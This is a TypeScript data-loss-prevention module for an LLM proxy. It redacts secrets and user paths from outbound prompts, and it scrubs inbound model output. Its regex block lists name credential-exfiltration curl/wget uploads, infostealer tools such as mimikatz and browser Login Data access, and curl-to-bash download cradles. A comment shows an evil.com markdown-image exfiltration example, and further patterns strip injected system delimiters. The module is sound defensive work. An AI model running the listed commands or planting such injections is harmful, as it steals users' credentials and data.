/**
 * Security Guard & Data Loss Prevention (DLP) Module
 * 
 * Protects against prompt injection, data exfiltration, browser credential theft,
 * and secret harvesting from untrusted or compromised upstream LLM providers.
 * 
 * Standards: OWASP Top 10 for LLM (LLM01: Prompt Injection, LLM02: Sensitive Info Disclosure)
 */

// --- High-Entropy Secret Detection Patterns ---
export const SECRET_PATTERNS: Array<{ name: string; regex: RegExp; placeholder: string }> = [
  // Private Keys (RSA, EC, OpenSSH, PGP, DSA)
  {
    name: "Private Key",
    regex: /-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,
    placeholder: "[REDACTED_PRIVATE_KEY]",
  },
  // OpenAI & Generic API keys (sk-...)
  {
    name: "OpenAI/Generic API Key",
    regex: /\bsk-[A-Za-z0-9_\-]{24,}\b/g,
    placeholder: "[REDACTED_API_KEY]",
  },
  // Google / Gemini API Keys (AIza...)
  {
    name: "Google Gemini API Key",
    regex: /\bAIza[0-9A-Za-z\-_]{30,36}\b/g,
    placeholder: "[REDACTED_AIZA_KEY]",
  },
  // AWS Access Key ID (AKIA...)
  {
    name: "AWS Access Key",
    regex: /\bAKIA[0-9A-Z]{16}\b/g,
    placeholder: "[REDACTED_AWS_KEY]",
  },
  // GitHub Personal Access Token (ghp, gho, ghu, ghs, ghr)
  {
    name: "GitHub Token",
    regex: /\bgh[pousr]_[A-Za-z0-9_]{36,}\b/g,
    placeholder: "[REDACTED_GITHUB_TOKEN]",
  },
  // Slack Tokens (xoxb, xoxp, xoxa, xoxr, xoxs)
  {
    name: "Slack Token",
    regex: /\bxox[baprs]-[0-9A-Za-z\-]{16,}\b/g,
    placeholder: "[REDACTED_SLACK_TOKEN]",
  },
  // Database Connection Strings with Passwords
  {
    name: "Database URL",
    regex: /\b(?:postgres|postgresql|mysql|mongodb|redis):\/\/[a-zA-Z0-9_\-\.]+:[^@\s"'`<>]+@[a-zA-Z0-9_\-\.]+(?::\d+)?(?:\/[^\s"'`<>]*)?/g,
    placeholder: "[REDACTED_DATABASE_URL]",
  },
  // JWT (JSON Web Tokens)
  {
    name: "JWT Token",
    regex: /\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+\b/g,
    placeholder: "[REDACTED_JWT_TOKEN]",
  },
  // Browser Cookies & Session Headers (Cookie: session=..., connect.sid=...)
  {
    name: "HTTP Cookie Header",
    regex: /\b(?:Cookie|Set-Cookie):\s*[^\r\n]+/gi,
    placeholder: "Cookie: [REDACTED_COOKIE_SESSION]",
  },
  // Session Cookie Tokens (connect.sid, JSESSIONID, PHPSESSID, auth_token, etc.)
  {
    name: "Session Cookie Token",
    regex: /\b(connect\.sid|JSESSIONID|PHPSESSID|session_id|session|auth_token|remember_token|access_token)=([A-Za-z0-9_\-\.%]{16,})/gi,
    placeholder: "$1=[REDACTED_SESSION_TOKEN]",
  },
  // Generic Bearer Tokens (except 'public')
  {
    name: "Bearer Token",
    regex: /\bBearer\s+(?!public\b)[A-Za-z0-9_\-\.]{24,}\b/g,
    placeholder: "Bearer [REDACTED_BEARER_TOKEN]",
  },
  // HTTP Basic Auth Header
  {
    name: "HTTP Basic Auth",
    regex: /\bAuthorization:\s*Basic\s+[A-Za-z0-9+/=]{8,}/gi,
    placeholder: "Authorization: Basic [REDACTED_BASIC_AUTH]",
  },
  // URL Query String Credentials (?token=..., ?password=...)
  {
    name: "URL Query Secret",
    regex: /([?&](?:password|passwd|token|access_token|auth_token|session|apiKey|secret)=)[^\s&"'`<>]+/gi,
    placeholder: "$1[REDACTED_QUERY_SECRET]",
  },
  // Browser Stored Credential Key-Value Pairs
  {
    name: "Browser Login Field",
    regex: /\b(password_value|username_value|origin_url)\s*[:=]\s*(['"]?)(?:(?!\2)[\S])+\2/gi,
    placeholder: "$1: [REDACTED]",
  },
  // .env style secret declarations (SECRET_KEY=..., PASSWORD=...)
  {
    name: "Env Secret Declaration",
    regex: /\b([A-Z0-9_]*(?:SECRET|PASSWORD|PASSWD|API_KEY|AUTH_KEY|PRIVATE_KEY|TOKEN)[A-Z0-9_]*)\s*=\s*(['"]?)(?:(?!\2)[\S]){8,}\2/gi,
    placeholder: "$1=[REDACTED_SECRET]",
  },
];

// --- Workspace Path Anonymization Patterns ---
const RE_WINDOWS_USER_PATH = /[a-zA-Z]:\\Users\\[^\s\\"'`]+(\\.*)?/gi;
const RE_UNIX_USER_PATH = /\/(?:home|Users)\/[^\s\/"'`]+(\/.*)?/gi;

/**
 * Redacts known high-entropy secrets and credential tokens from text.
 */
export function redactSecrets(text: string): string {
  if (!text || typeof text !== "string") return text;
  let result = text;
  for (const { regex, placeholder } of SECRET_PATTERNS) {
    result = result.replace(regex, placeholder);
  }
  return result;
}

/**
 * Anonymizes local filesystem paths containing user profile names.
 * Replaces e.g. C:\Users\Username\Project with /workspace/Project
 */
export function anonymizeWorkspacePaths(text: string): string {
  if (!text || typeof text !== "string") return text;
  let result = text;
  result = result.replace(RE_WINDOWS_USER_PATH, (_match, rest) => {
    return `/workspace${rest ? rest.replace(/\\/g, "/") : ""}`;
  });
  result = result.replace(RE_UNIX_USER_PATH, (_match, rest) => {
    return `/workspace${rest || ""}`;
  });
  return result;
}

/**
 * Cleans outbound messages sent from the client before dispatching to upstream.
 */
export function sanitizeOutboundMessages(
  messages: any[],
  options: { maskSecrets?: boolean; maskPaths?: boolean } = { maskSecrets: true, maskPaths: true }
): any[] {
  if (!Array.isArray(messages)) return messages;

  return messages.map((m) => {
    if (!m) return m;
    const copy = { ...m };
    if (typeof copy.content === "string") {
      let content = copy.content;
      if (options.maskSecrets !== false) content = redactSecrets(content);
      if (options.maskPaths !== false) content = anonymizeWorkspacePaths(content);
      copy.content = content;
    } else if (Array.isArray(copy.content)) {
      copy.content = copy.content.map((part: any) => {
        if (part && typeof part.text === "string") {
          let text = part.text;
          if (options.maskSecrets !== false) text = redactSecrets(text);
          if (options.maskPaths !== false) text = anonymizeWorkspacePaths(text);
          return { ...part, text };
        }
        return part;
      });
    }
    return copy;
  });
}

// --- Inbound Response Sanitizer (Anti-Exfiltration & Injected Delimiters) ---

// Markdown image tags pointing to external HTTP/HTTPS domains: ![alt](https://evil.com/leak?q=...)
const RE_MARKDOWN_EXTERNAL_IMAGE = /!\[([^\]]*)\]\((https?:\/\/[^\)]+)\)/gi;

// Injected system delimiters emitted by rogue models to poison agent conversational context
const RE_SYSTEM_DELIMITERS = /<\/?(?:system|instruction|admin|developer)>/gi;
const RE_PROMPT_WRAPPER = /\[\/?(?:SYSTEM|INSTRUCTION|PROMPT)\]/g;
const RE_IM_DELIMITERS = /<\|im_start\|>(?:system|admin)|<\|im_end\|>/gi;

// Malicious exfiltration command patterns commonly injected by rogue models into tool calls or code blocks
const RE_EXFIL_COMMANDS = /(?:curl|wget)\s+[^\n]*(?:--data|-d|--upload-file|-T)\s+@?(?:[a-zA-Z0-9_\-\.\/]*\.env|.*id_rsa|.*passwd|.*credentials|.*Cookies|.*Login Data|.*Local State)/gi;

// Infostealer & browser credential theft utilities commonly weaponized by rogue agentic payloads
const RE_INFOSTEALER_COMMANDS = /(?:CryptUnprotectData|ProtectedData|sqlite3\s+[^\n]*(?:Login Data|Cookies|cookies\.sqlite|key4\.db|logins\.json)|certutil\s+-(?:urlcache|decode)|powershell[^\n]*(?:-enc|-EncodedCommand)\s+[A-Za-z0-9+/=]{20,}|cmdkey\s+\/list|vaultcmd|mimikatz)/gi;

// Hazardous download cradles (piping web output directly to shell interpreter)
const RE_DOWNLOAD_CRADLES = /(?:(?:curl|wget)\s+[^\n]*\|\s*(?:bash|sh|zsh|powershell|pwsh|cmd)|(?:irm|Invoke-WebRequest)\s+[^\n]*\|\s*(?:iex|Invoke-Expression)|bitsadmin\s+\/transfer)/gi;

// Cross-platform browser credential & keychain theft targets
const RE_BROWSER_KEYCHAIN_THEFT = /(?:(?:Google[\\\/]Chrome|Microsoft[\\\/]Edge|BraveSoftware[\\\/]Brave-Browser|Mozilla[\\\/]Firefox|Opera Software)[\\\/][^\n]*(?:Login Data|Cookies|Local State|key4\.db|logins\.json)|security\s+(?:find-generic-password|dump-keychain)|secret-tool\s+lookup)/gi;

/**
 * Sanitizes inbound content returned by an upstream provider.
 * Neutralizes markdown image exfiltration, browser infostealer commands, and system prompt delimiter injection.
 */
export function sanitizeInboundContent(
  text: string,
  options: {
    sanitizeMarkdownImages?: boolean;
    stripSystemInjections?: boolean;
    blockDangerousExfiltration?: boolean;
  } = {
    sanitizeMarkdownImages: true,
    stripSystemInjections: true,
    blockDangerousExfiltration: true,
  }
): string {
  if (!text || typeof text !== "string") return text;
  let result = text;

  // 1. Neutralize Markdown Image Exfiltration
  if (options.sanitizeMarkdownImages !== false) {
    result = result.replace(RE_MARKDOWN_EXTERNAL_IMAGE, (_match, alt, url) => {
      return `[External image link neutralized to prevent data exfiltration: ${alt || "image"}](${url})`;
    });
  }

  // 2. Strip fake system / instruction tags
  if (options.stripSystemInjections !== false) {
    result = result.replace(RE_SYSTEM_DELIMITERS, "");
    result = result.replace(RE_PROMPT_WRAPPER, "");
    result = result.replace(RE_IM_DELIMITERS, "");
  }

  // 3. Block malicious exfiltration shell commands, infostealers, and hazardous download cradles
  if (options.blockDangerousExfiltration !== false) {
    result = result.replace(RE_EXFIL_COMMANDS, (cmd) => {
      return `[BLOCKED BY ALPHAWAY: Potentially dangerous command exfiltrating local credentials] # Original: ${cmd}`;
    });
    result = result.replace(RE_INFOSTEALER_COMMANDS, (cmd) => {
      return `[BLOCKED BY ALPHAWAY: Detected browser credential harvesting / infostealer command] # Original: ${cmd}`;
    });
    result = result.replace(RE_DOWNLOAD_CRADLES, (cmd) => {
      return `[BLOCKED BY ALPHAWAY: Detected hazardous download-and-execute shell cradle] # Original: ${cmd}`;
    });
    result = result.replace(RE_BROWSER_KEYCHAIN_THEFT, (cmd) => {
      return `[BLOCKED BY ALPHAWAY: Detected browser credential / keychain theft] # Original: ${cmd}`;
    });
  }

  return result;
}
